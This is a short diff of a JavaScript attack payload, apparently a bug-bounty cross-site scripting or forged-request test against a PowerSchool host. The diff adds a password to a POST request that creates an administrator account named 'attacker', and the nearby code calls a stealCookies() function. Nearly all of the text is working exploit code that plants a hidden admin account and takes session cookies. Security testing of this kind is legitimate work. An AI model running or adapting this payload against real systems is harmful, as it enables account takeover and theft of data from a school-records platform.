@@ -26,6 +26,6 @@ httpRequest.send();
 
 httpRequest.open('POST', 'https://pentest.sfe.powerschool.com/profileMainAction.do', true); 
 httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-httpRequest.send('employeeSearchId=&accessIdStr=9999&webPassword=&lastName=attacker&firstName=John&email=esperamier%40bugcrowdninja.com&pin=&externalId=&customField1=&customField2=&customField3=&customField4=&customField5=&customField6=&customField7=&customField8=&phone1=2126909455&addressLn1=1870+Oakwood+Avenue&addressLn2=&city=New+York&state=NY&zip=10031&genderCd=0&ethnicityCd=0&languageId=1&roleAdm=on&activeAdm=on&calendarId=-99&disableJobShopping=false&callBackNumber=&submitInsert=Save');//发送请求 将情头体写在send中
+httpRequest.send('employeeSearchId=&accessIdStr=9999&webPassword=AttackerMe&lastName=attacker&firstName=John&email=esperamier%40bugcrowdninja.com&pin=&externalId=&customField1=&customField2=&customField3=&customField4=&customField5=&customField6=&customField7=&customField8=&phone1=2126909455&addressLn1=1870+Oakwood+Avenue&addressLn2=&city=New+York&state=NY&zip=10031&genderCd=0&ethnicityCd=0&languageId=1&roleAdm=on&activeAdm=on&calendarId=-99&disableJobShopping=false&callBackNumber=&submitInsert=Save');//发送请求 将情头体写在send中
 
 stealCookies();
